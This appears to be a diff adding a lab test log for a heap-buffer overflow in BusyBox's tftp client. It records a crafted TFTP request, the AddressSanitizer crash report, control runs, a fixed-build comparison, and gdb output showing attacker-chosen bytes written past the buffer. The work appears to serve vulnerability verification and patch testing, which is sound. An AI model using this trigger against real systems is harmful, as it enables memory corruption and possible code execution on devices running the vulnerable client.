@@ -1,0 +1,86 @@
+=== CLOCK Mon Nov 23 10:36:59 PM UTC 2026
+=== PINS
+3311dff32e746499f4df0d5df04d7eb396382d7e108bb9250e7b519b837043a4  busybox-1.37.0.tar.bz2
+183410e8b1bbf9e07397d6ccf9eb20fa13c2644b8fffb4a40b94855f1d3b7044  vuln-tftp.c
+015669f9c8924fd006b02abcc2cb6665d9ec5cd7f749d8ca8b16859c996c888f  fixed-tftp.c
+46b20cb0107f457aea56dfd874ebf70fff2c5b009008f5571edd723d7820c2a1  fix.patch
+0013e9354961693f136572ec6e37dceb883b6951edcf01f423b276ed2aa765f5  busybox.config
+a5ff884980b33760a9b0dbdb25e983b86eaafe4f75354b8d9ba744431b71cf51  busybox-asan
+2e2b327c153aace6333c5228365fffcfaa2eb6389c1b48835c9fc61cd38b234b  busybox-fixed
+4ec897f312dd74a98cd1c127b662a88d13f5aec92e62e78a11193ac0ac996763  busybox-plain
+=== 1 ATTACK VULNERABLE ASAN (expect ASan WRITE of size 516)
+REQ 33 bytes: b'\x00\x01MISHE\x00octet\x00blksize\x0064\x00tsize\x000\x00'
+RC 1
+STDOUT 
+STDERR tftp: falling back to blocksize 512
+=================================================================
+==1437561==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x507000000144 at pc 0x75a883a79d69 bp 0x7fff8b65b110 sp 0x7fff8b65a8c8
+WRITE of size 516 at 0x507000000144 thread T0
+    #0 0x75a883a79d68 in read ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:978
+    #1 0x63e9581ba3bc  (/home/mesh-home/mishe-tauftauf2shell/lab/frontier/busybox2shell/busybox-asan+0x383bc) (BuildId: 691135f591eb079bc1cf83eb06f023a88a5fa789)
+    #2 0x63e958193194  (/home/mesh-home/mishe-tauftauf2shell/lab/frontier/busybox2shell/busybox-asan+0x11194) (BuildId: 691135f591eb079bc1cf83eb06f023a88a5fa789)
+    #3 0x63e9581908fd  (/home/mesh-home/mishe-tauftauf2shell/lab/frontier/busybox2shell/busybox-asan+0xe8fd) (BuildId: 691135f591eb079bc1cf83eb06f023a88a5fa789)
+    #4 0x63e958190a41  (/home/mesh-home/mishe-tauftauf2shell/lab/frontier/busybox2shell/busybox-asan+0xea41) (BuildId: 691135f591eb079bc1cf83eb06f023a88a5fa789)
+    #5 0x75a88362a1c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
+    #6 0x75a88362a28a in __libc_start_main_impl ../csu/libc-start.c:360
+    #7 0x63e958190544  (/home/mesh-home/mishe-tauftauf2shell/lab/frontier/busybox2shell/busybox-asan+0xe544) (BuildId: 691135f591eb079bc1cf83eb06f023a88a5fa789)
+
+0x507000000144 is located 0 bytes after 68-byte region [0x507000000100,0x507000000144)
+allocated by thread T0 here:
+    #0 0x75a883afd9c7 in malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:69
+    #1 0x63e9581bfb45  (/home/mesh-home/mishe-tauftauf2shell/lab/frontier/busybox2shell/busybox-asan+0x3db45) (BuildId: 691135f591eb079bc1cf83eb06f023a88a5fa789)
+    #2 0x63e958192aff  (/home/mesh-home/mishe-tauftauf2shell/lab/frontier/busybox2shell/busybox-asan+0x10aff) (BuildId: 691135f591eb079bc1cf83eb06f023a88a5fa789)
+    #3 0x63e9581908fd  (/home/mesh-home/mishe-tauftauf2shell/lab/frontier/busybox2shell/busybox-asan+0xe8fd) (BuildId: 691135f591eb079bc1cf83eb06f023a88a5fa789)
+    #4 0x63e958190a41  (/home/mesh-home/mishe-tauftauf2shell/lab/frontier/busybox2shell/busybox-asan+0xea41) (BuildId: 691135f591eb079bc1cf83eb06f023a88a5fa789)
+    #5 0x75a88362a1c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
+    #6 0x75a88362a28a in __libc_start_main_impl ../csu/libc-start.c:360
+    #7 0x63e958190544  (/home/mesh-home/mishe-tauftauf2shell/lab/frontier/busybox2shell/busybox-asan+0xe544) (BuildId: 691135f591eb079bc1cf83eb06f023a88a5fa789)
+
+SUMMARY: AddressSanitizer: heap-buffer-overflow ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:978 in read
+Shadow bytes around the buggy address:
+  0x506ffffffe80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x506fffffff00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x506fffffff80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x507000000000: fa fa fa fa 00 00 00 00 00 00 00 00 04 fa fa fa
+  0x5070
+=== 2 SAFE OACK CONTROL (expect rc 0, no ASan)
+REQ 33 bytes: b'\x00\x01MISHE\x00octet\x00blksize\x0064\x00tsize\x000\x00'
+RC 0
+STDOUT 
+STDERR 
+=== 3 SAFE DEFAULT-BLKSIZE CONTROL (expect rc 0, no ASan)
+REQ 22 bytes: b'\x00\x01MISHE\x00octet\x00tsize\x000\x00'
+RC 0
+STDOUT 
+STDERR 
+=== 4 FIXED BUILD SAME ATTACK (expect no ASan)
+REQ 33 bytes: b'\x00\x01MISHE\x00octet\x00blksize\x0064\x00tsize\x000\x00'
+RC 1
+STDOUT 
+STDERR tftp: falling back to blocksize 512
+tftp: timeout
+
+=== 5 PLAIN BUILD GDB CHOSEN BYTES (expect MISHE-OOTAUFTAUF at rbuf+68)
+REQ b'\x00\x01MISHE\x00octet\x00blksize\x0064\x00tsize\x000\x00'
+Breakpoint 1 at 0x6d2b: file networking/tftp.c, line 604.
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+
+Breakpoint 1, tftp_protocol (our_lsa=0xffffffffffffffff, peer_lsa=0x55555557c2a0, local_file=0x7fffffffe668 "/home/mesh-home/mishe-tauftauf2shell/lab/frontier/busybox2shell/gdb-out.bin", remote_file=0x7fffffffe6b7 "MISHE", want_transfer_size=1, blksize=64) at networking/tftp.c:604
+604				if (len < 0) {
+FIRST RBUF=0x55555557c310 IO_BUFSIZE=68 LEN=4
+tftp: falling back to blocksize 512
+
+Breakpoint 1, tftp_protocol (our_lsa=0xffffffffffffffff, peer_lsa=0x55555557c2a0, local_file=0x7fffffffe668 "/home/mesh-home/mishe-tauftauf2shell/lab/frontier/busybox2shell/gdb-out.bin", remote_file=0x7fffffffe6b7 "MISHE", want_transfer_size=1, blksize=512) at networking/tftp.c:604
+604				if (len < 0) {
+SECOND RBUF=0x55555557c310 IO_BUFSIZE=516 LEN=516
+0x55555557c350:	0xe5	0xec	0xf3	0xfa	0x4d	0x49	0x53	0x48
+0x55555557c358:	0x45	0x2d	0x4f	0x4f	0x54	0x41	0x55	0x46
+0x55555557c360:	0x54	0x41	0x55	0x46	0x71	0x78	0x7f	0x86
+0x55555557c368:	0x8d	0x94	0x9b	0xa2	0xa9	0xb0	0xb7	0xbe
+0x55555557c354:	"MISHE-OOTAUFTAUFqx\177\206\215\224\233\242\251\260\267\276\305\314\323\332\341\350\357\366\375\004\v\022\031 '.5<CJQX_fmt{\202\211\220\227\236\245\254\263\272\301\310\317\326\335\344\353\362", <incomplete sequence \371>
+#0  tftp_protocol (our_lsa=0xffffffffffffffff, peer_lsa=0x55555557c2a0, local_file=0x7fffffffe668 "/home/mesh-home/mishe-tauftauf2shell/lab/frontier/busybox2shell/gdb-out.bin", remote_file=0x7fffffffe6b7 "MISHE", want_transfer_size=1, blksize=512) at networking/tftp.c:604
+#1  0x000055555555b251 in tftp_main (argc=10, argv=0x7fffffffe1f0) at networking/tftp.c:867
+#2  0x0000555555559514 in run_applet_no_and_exit (applet_no=1, name=0x7fffffffe657 "tftp", argv=0x7fffffffe1b0) at libbb/appletlib.c:969
+
+=== DONE Mon Nov 23 10:37:34 PM UTC 2026
